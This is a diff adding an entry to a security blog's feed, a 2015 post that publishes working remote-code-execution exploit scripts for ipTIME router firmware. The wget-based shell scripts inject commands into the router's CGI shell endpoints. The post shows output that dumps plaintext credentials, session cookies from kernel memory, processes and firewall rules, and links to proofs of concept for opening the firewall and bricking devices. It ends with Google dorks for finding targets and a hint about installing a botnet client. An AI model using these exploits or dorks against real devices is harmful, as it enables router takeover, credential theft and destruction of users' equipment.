@@ -4,6 +4,261 @@
     <title>A slice of Kimchi - IT Security Blog</title>
     
     <entry>
+        <title>Exploit Code for ipTIME firmwares < 9.58 RCE with root privileges against 127 router models</title>
+        <link href="2015-07-01-poc-with-RCE-against-127-iptime-router-models.html"/>
+        <content type="html"><h2>Disclaimer</h2>
+<pre><code>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
+</code></pre>
+<p>As stated in <a href="https://pierrekim.github.io/blog/2015-04-20-112-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">the precedent advisories</a>, ipTIME firmwares prior to 9.58 version are vulnerable to a remote code execution which gives root privileges.</p>
+<p>From product_db extracted from a live ipTIME system, it concerns at least these devices:</p>
+<pre><code>g1 g104a g104be g104i g104m g501 i1601 ic416 ic426 in524 ip0526 ip300 ip409 ip410 ip416 ip418 ip419
+ip422 ip449 ip802 ip803 n104 n104a n104i n104m n2 n3004 n5004 n504 n6004 n604 n604i n604m n7004
+n704 n704m nx505 q1 q304 q504 t1004 t1008 t2008 tq204 tv104 tv108 tv116 tv124 x1005 x3003 x5007 z54g
+</code></pre>
+<p>By analysis updated firmwares, <a href="https://pierrekim.github.io/blog/2015-05-05-127-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">in total 127 devices were affected</a>:</p>
+<pre><code>a1004 a1004v a104 a104ns a104r a2004 a2004ns a2004r a2008 a3004 a3004ns a5004ns a604 a604v extac extd2
+g1 g104 g104a g104be g104i g104m g204 g501 g504 ipsmart mini mobap1 multi n1 n104 n104a n104ar1 n104i
+n104k n104ktt n104m n104p n104q n104r n104r3 n104rsk n104s n104sr1 n104t n104v n104vlg n1e n1eky n1p
+n2 n2e n2p n3004 n5 n5004 n504 n5r1 n6004 n6004m n6004r n604 n604a n604i n604m n604p n604r n604s
+n604t n604v n604vlg n608 n7004ns n702bcm n704 n704a n704a3 n704bcm n704lg n704m n704mlg n704ns
+n704s n704v n704v3 n8004 n8004r n8004v n804 n804a n804a3 n804t n804t3 n804v n904 n904ns n904v
+ng104 ng304 ntq104 ntv108 ntv116 ntv124 q1 q304 q504 q604 t1004 t1008 t16000 t2008 t24000 t3004
+t3008 timeve tq204 tv104 v1016 v1024 v304 v308 v504 wre1 x3003 x3007 x5007 x6003
+</code></pre>
+<p>Here are the working exploits:</p>
+<p><strong>Exploit against the firmwares in ALL versions from 2008 to 2015 - until 9.50 firmware:</strong></p>
+<pre><code>$ cat iptime.carnage.l2
+#!/bin/sh
+
+if [ ! $1 ]; then
+  echo "Usage:"
+  echo $0 ip command
+  exit 1
+fi
+
+wget -qO- --post-data="echo 'Content-type: text/plain
+
+'; PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh
+$
+</code></pre>
+<p><strong>Exploit against firmware v9.52:</strong></p>
+<pre><code>$ cat iptime.carnage.l2.v9.52 
+#!/bin/sh
+
+if [ ! $1 ]; then
+  echo "Usage:"
+  echo $0 ip command
+  exit 1
+fi
+
+wget -qO- --post-data="echo 'Content-type: text/plain
+
+'; PATH=$PATH:/sbin:/bin $2 $3 $4" http://$1/sess-bin/sh
+$
+</code></pre>
+<p><a href="http://pierrekim.github.io/advisories/">The exploits have been written in HTML/JavaScript allowing people to test their systems in live using their browsers!</a></p>
+<p>Now we test the exploits in my lab!</p>
+<p><strong>How to retrieve the credentials ? (see login and password at the end of the text file)</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-dump.configuration.including.credentials.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-dump.configuration.including.credentials.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-dump.configuration.png" /></p>
+<p>Using CLI:</p>
+<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /tmp/etc/iconfig.cfg
+wantype.wan1=dynamic
+dhblock.eth1=0
+ppp_mtu=1454
+fakedns=0
+upnp=1
+ppp_mtu=1454
+timeserver=time.windows.com,gmt23,1,540,0
+wan_ifname=eth1
+auto_dns=1
+dhcp_auto_detect=0
+wireless_ifmode+wlan0=wlan0,0
+dhcpd=1
+lan_ip=192.168.0.1
+lan_netmask=255.255.255.0
+dhcpd_conf=br0,192.168.0.2,192.168.0.254,192.168.0.1,255.255.255.0
+dhcpd_dns=164.124.101.2,168.126.63.2
+dhcpd_opt=7200,30,200,
+dhcpd_configfile=/etc/udhcpd.conf
+dhcpd_lease_file=/etc/udhcpd.leases
+dhcpd_static_lease_file=/etc/udhcpd.static
+http_auth=session
+use_captcha=1
+login=test
+password=test
+org_hwaddr.eth1=90:9F:XX:XX:XX
+nat_passthrough=0
+kali#
+</code></pre>
+<p>Login and password are stored in plaintext, which is a very bad security practice.</p>
+<p><strong>Listing of the filesystem</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-listing.of.the.root.filesystem.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-listing.of.the.root.filesystem.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-ls-latrR-root.png" /></p>
+<p><strong>Current running process:</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-current.process.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-current.process.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-ps.png" /></p>
+<p>Using CLI:</p>
+<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 ps -auxww
+  PID  Uid     VmSize Stat Command
+    1 root        720 S   init single 
+    2 root            SW  [keventd]
+    3 root            RWN [ksoftirqd_CPU0]
+    4 root            SW  [kswapd]
+    5 root            SW  [bdflush]
+    6 root            SW  [kupdated]
+    7 root            SW  [mtdblockd]
+  252 root       1176 S   /sbin/dhcpd 
+  270 root        436 S   apcpd 
+  272 root        432 S   /sbin/iptables-q 
+  299 root        372 S   /bin/wscd -start -c /var/wsc.conf -w wlan0 -fi /var/w
+  303 root        260 S   /bin/iwcontrol wlan0 
+  463 root        684 S   httpd 
+  496 root        288 S   /bin/sh 
+  498 root        300 R   ps -auxww 
+kali#
+</code></pre>
+<p><strong>Getting the kernel memory:</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-getting.kernel.memory.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-getting.kernel.memory.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-dump.mem.png" /></p>
+<p>Using CLI:</p>
+<pre><code>./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/kcore
+</code></pre>
+<p>The device runs Linux 2.4.18, 12 year old Linux, full of CVEs (local AND <em>remote</em>):</p>
+<pre><code>&lt;4&gt;Linux version 2.4.18-MIPS-01.00 (rtlwl@ski) (gcc version 3.4.6-1.3.6) #128 Tue Feb 10 10:57:17 KST 2015
+&lt;4&gt;early printk enabled 
+&lt;4&gt;Determined physical RAM map:
+&lt;4&gt; memory: 01000000 @ 00000000 (usable)
+&lt;4&gt;On node 0 totalpages: 4096
+&lt;4&gt;zone(0): 4096 pages.
+&lt;4&gt;zone(1): 0 pages.
+&lt;4&gt;zone(2): 0 pages.
+&lt;4&gt;Kernel command line: root=/dev/mtdblock1 console=0 single
+&lt;4&gt;Calibrating delay loop... 399.76 BogoMIPS
+&lt;4&gt;Memory: 9500k/16384k available (2310k kernel code, 6884k reserved, 416k data, 60k init, 0k highmem)
+&lt;4&gt;Dentry-cache hash table entries: 2048 (order: 2, 16384 bytes)
+&lt;4&gt;Inode-cache hash table entries: 1024 (order: 1, 8192 bytes)
+&lt;4&gt;Mount-cache hash table entries: 512 (order: 0, 4096 bytes)
+&lt;4&gt;Buffer-cache hash table entries: 1024 (order: 0, 4096 bytes)
+&lt;4&gt;Page-cache hash table entries: 4096 (order: 2, 16384 bytes)
+</code></pre>
+<p><strong>Grabbing the valid HTTP authentication cookies:</strong></p>
+<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/kcore | strings | grep Cookie
+
+Cookie: efm_session_id=iNYV3r097DPbMDWu
+Cookie: efm_session_id=iNYV3r097DPbMDWu
+Cookie: efm_session_id=i3HJh4V15YLkf2l2
+Cookie: efm_session_id=i3HJh4V15YLkf2l2
+Cookie: efm_session_id=iNYV3r097DPbMDWu
+Cookie: efm_session_id=iNYV3r097DPbMDWu
+Cookie: efm_session_id=i3HJh4V15YLkf2l2
+Cookie: efm_session_id=i3HJh4V15YLkf2l2
+Cookie: efm_session_id=i3HJh4V15YLkf2l2
+Cookie: efm_session_id=iNYV3r097DPbMDWu
+Cookie: efm_session_id=iNYV3r097DPbMDWu
+Cookie: efm_session_id=iNYV3r097DPbMDWu
+</code></pre>
+<p><strong>Default firewall rules:</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-default.firewall.rules.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-default.firewall.rules.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-iptables.png" /></p>
+<p>Using CLI:</p>
+<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 iptables -nL
+
+Chain INPUT (policy DROP)
+target     prot opt source               destination
+DROP       47   --  0.0.0.0/0            0.0.0.0/0
+DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:1723
+radius2g   all  --  0.0.0.0/0            0.0.0.0/0
+ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp spt:25
+ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80
+ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0
+ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp dpts:67:68
+ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp spt:53
+ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp spt:80
+ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp spt:36500
+ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0          udp dpts:33434:33600
+ACCEPT     icmp --  192.168.0.1          192.168.0.1        icmp type 8
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination
+TCPMSS     tcp  --  0.0.0.0/0            0.0.0.0/0          tcp flags:0x06/0x02 TCPMSS clamp to PMTU
+app_filter  all  --  0.0.0.0/0            0.0.0.0/0
+app_forward  all  --  0.0.0.0/0            0.0.0.0/0
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain app_filter (1 references)
+target     prot opt source               destination
+
+Chain app_forward (1 references)
+target     prot opt source               destination
+
+Chain ext_accesslist (0 references)
+target     prot opt source               destination
+DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80
+
+Chain int_accesslist (0 references)
+target     prot opt source               destination
+RETURN     all  --  0.0.0.0/0            192.168.255.250
+RETURN     all  --  0.0.0.0/0            192.168.255.1
+DROP       tcp  --  0.0.0.0/0            0.0.0.0/0          tcp dpt:80
+
+Chain plantynet (0 references)
+target     prot opt source               destination
+plantynet_free  all  --  0.0.0.0/0            0.0.0.0/0
+QUEUE      tcp  --  0.0.0.0/0            0.0.0.0/0          multiport dports 80,8080
+
+Chain plantynet_free (1 references)
+target     prot opt source               destination
+
+Chain radius2g (1 references)
+target     prot opt source               destination
+
+Chain upnp (0 references)
+target     prot opt source               destination
+</code></pre>
+<p><strong>Opening the management interface on the WAN:</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-opening.the.firewall.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-opening.the.firewall.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-flushing.iptables.png" /></p>
+<p><strong>Architecture:</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52.grabbing.cpu.info.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52.grabbing.cpu.info.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-proc-cpuinfo.png" /></p>
+<p>Using CLI:</p>
+<pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/cpuinfo
+
+system type             : Philips Nino
+processor               : 0
+cpu model               : R3000 V0.0
+BogoMIPS                : 399.76
+wait instruction        : yes
+microsecond timers      : no
+tlb_entries             : 32
+extra interrupt vector  : no
+hardware watchpoint     : no
+VCED exceptions         : not available
+VCEI exceptions         : not available
+ll emulations           : 0
+sc emulations           : 0
+</code></pre>
+<p><strong>Reboot the device:</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-reboot.html">An JavaScript online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-reboot.html">(exploit for version 9.52)</a></p>
+<p><img alt="" src="images/2015-iptime-0x00-reboot.png" /></p>
+<p><strong>Brick the device:</strong></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-bricking.the.device.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-bricking.the.device.html">(exploit for version 9.52)</a></p>
+<p><strong>By the way, d.cgi in /bin/ is an intentional backdoor from ipTIME.</strong></p>
+<p>Uploading and executing a botnet client is left as an exercise to the reader.</p>
+<p>More fun from iptime products is coming ~~~</p>
+<p>Follow me on Twitter <a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>.</p>
+<h2>Google Dork:</h2>
+<pre><code>inurl:timepro.cgi
+iptime.org ddns
+inurl:iptime.org
+</code></pre></content>
+    </entry>
+    
+    <entry>
         <title>Small monitoring system using Freemobile</title>
         <link href="2015-06-23-small-monitoring-system-using-freemobile.html"/>
         <content type="html"><p>Hello,</p>
